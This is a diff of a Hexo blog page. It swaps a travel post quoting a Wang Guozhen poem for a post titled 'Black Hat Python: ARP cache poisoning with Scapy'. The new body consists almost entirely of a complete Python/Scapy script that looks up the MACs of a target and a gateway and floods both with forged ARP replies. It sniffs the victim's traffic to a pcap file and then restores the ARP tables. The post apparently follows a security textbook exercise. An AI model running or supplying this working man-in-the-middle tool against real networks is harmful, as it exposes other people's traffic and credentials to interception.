@@ -35,25 +35,25 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="是遥远的地方对我们都有一种诱惑不是诱惑于美丽就是诱惑于传说
-即使远方的风景并不尽如人意我们也无需在乎因为这实在是一个迷人的错
-到远方去到远方去熟悉的地方没有景色
-——汪国真">
+<meta name="description" content="用到了Scapy的ARP类、srp等方法
+
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293">
 <meta property="og:type" content="article">
-<meta property="og:title" content="旅行">
-<meta property="og:url" content="http://yoursite.com/2015/05/17/Travel/index.html">
+<meta property="og:title" content="Python黑帽子:利用Scapy进行ARP缓存投毒">
+<meta property="og:url" content="http://yoursite.com/2015/09/10/ARPPoison/index.html">
 <meta property="og:site_name" content="rootat">
-<meta property="og:description" content="是遥远的地方对我们都有一种诱惑不是诱惑于美丽就是诱惑于传说
-即使远方的风景并不尽如人意我们也无需在乎因为这实在是一个迷人的错
-到远方去到远方去熟悉的地方没有景色
-——汪国真">
-<meta property="og:updated_time" content="2015-08-28T14:38:32.823Z">
+<meta property="og:description" content="用到了Scapy的ARP类、srp等方法
+
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293">
+<meta property="og:updated_time" content="2015-09-10T02:40:29.552Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="旅行">
-<meta name="twitter:description" content="是遥远的地方对我们都有一种诱惑不是诱惑于美丽就是诱惑于传说
-即使远方的风景并不尽如人意我们也无需在乎因为这实在是一个迷人的错
-到远方去到远方去熟悉的地方没有景色
-——汪国真">
+<meta name="twitter:title" content="Python黑帽子:利用Scapy进行ARP缓存投毒">
+<meta name="twitter:description" content="用到了Scapy的ARP类、srp等方法
+
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -63,7 +63,7 @@
   };
 </script>
 
-  <title> 旅行 | rootat </title>
+  <title> Python黑帽子:利用Scapy进行ARP缓存投毒 | rootat </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -154,7 +154,7 @@
           
           
             
-              旅行
+              Python黑帽子:利用Scapy进行ARP缓存投毒
             
           
         </h1>
@@ -163,8 +163,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-05-17T22:29:38+08:00" content="2015-05-17">
-            2015-05-17
+          <time itemprop="dateCreated" datetime="2015-09-10T10:37:30+08:00" content="2015-09-10">
+            2015-09-10
           </time>
         </span>
 
@@ -174,8 +174,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/05/17/Travel/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/05/17/Travel/" itemprop="commentsCount"></span>
+            <a href="/2015/09/10/ARPPoison/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/09/10/ARPPoison/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -189,10 +189,12 @@
       
 
       
-        <span itemprop="articleBody"><p>是遥远的地方<br>对我们都有一种诱惑<br>不是诱惑于美丽<br>就是诱惑于传说</p>
-<p>即使远方的风景<br>并不尽如人意<br>我们也无需在乎<br>因为这实在是一个<br>迷人的错</p>
-<p>到远方去<br>到远方去<br>熟悉的地方没有景色</p>
-<p>——汪国真</p>
+        <span itemprop="articleBody"><blockquote>
+<ul>
+<li>用到了Scapy的ARP类、srp等方法</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">interface    = <span class="string">"en1"</span></span><br><span class="line">target_ip    = <span class="string">"172.16.1.71"</span></span><br><span class="line">gateway_ip   = <span class="string">"172.16.1.254"</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line">poisoning    = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span><span class="params">(gateway_ip,gateway_mac,target_ip,target_mac)</span>:</span>	<span class="comment">#恢复正常</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Restoring target..."</span></span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,hwsrc=gateway_mac),count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>,hwsrc=target_mac),count=<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(ip_address)</span>:</span>	<span class="comment">#IP转MAC地址 用到srp方法</span></span><br><span class="line">    </span><br><span class="line">    responses,unanswered = srp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)/ARP(pdst=ip_address),timeout=<span class="number">2</span>,retry=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> s,r <span class="keyword">in</span> responses:	<span class="comment">#返回MAC地址</span></span><br><span class="line">        <span class="keyword">return</span> r[Ether].src</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target</span><span class="params">(gateway_ip,gateway_mac,target_ip,target_mac)</span>:</span>	<span class="comment">#投毒函数</span></span><br><span class="line">    <span class="keyword">global</span> poisoning</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#ARP包</span></span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op   = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst= target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op   = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst= gateway_mac</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Beginning the ARP poison. [CTRL-C to stop]"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> poisoning:</span><br><span class="line">        send(poison_target)</span><br><span class="line">        send(poison_gateway)</span><br><span class="line">          </span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">          </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] ARP poison attack finished."</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conf.iface = interface</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭输出</span></span><br><span class="line">conf.verb  = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Setting up %s"</span> % interface</span><br><span class="line"></span><br><span class="line">gateway_mac = get_mac(gateway_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> gateway_mac <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!!!] Failed to get gateway MAC. Exiting."</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Gateway %s is at %s"</span> % (gateway_ip,gateway_mac)</span><br><span class="line"></span><br><span class="line">target_mac = get_mac(target_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!!!] Failed to get target MAC. Exiting."</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Target %s is at %s"</span> % (target_ip,target_mac)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 启动投毒线程</span></span><br><span class="line">poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))</span><br><span class="line">poison_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Starting sniffer for %d packets"</span> % packet_count</span><br><span class="line">    </span><br><span class="line">    bpf_filter  = <span class="string">"ip host %s"</span> % target_ip</span><br><span class="line">    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Writing packets to arper.pcap"</span></span><br><span class="line">    wrpcap(<span class="string">'arper.pcap'</span>,packets)</span><br><span class="line"></span><br><span class="line">    poisoning = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重置网络</span></span><br><span class="line">    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 </span>
       
     </div>
@@ -204,11 +206,11 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/09/02/ReplaceNetCat/" rel="prev">Python黑帽子:取代NetCat</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/09/06/SSHReverseTunnel/" rel="next">Python黑帽子:SSH反向隧道</a>
             
           </div>
         </div>
@@ -370,9 +372,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = 'rootat';
-      var disqus_identifier = '2015/05/17/Travel/';
-      var disqus_title = '旅行';
-      var disqus_url = 'http://yoursite.com/2015/05/17/Travel/';
+      var disqus_identifier = '2015/09/10/ARPPoison/';
+      var disqus_title = 'Python黑帽子:利用Scapy进行ARP缓存投毒';
+      var disqus_url = 'http://yoursite.com/2015/09/10/ARPPoison/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
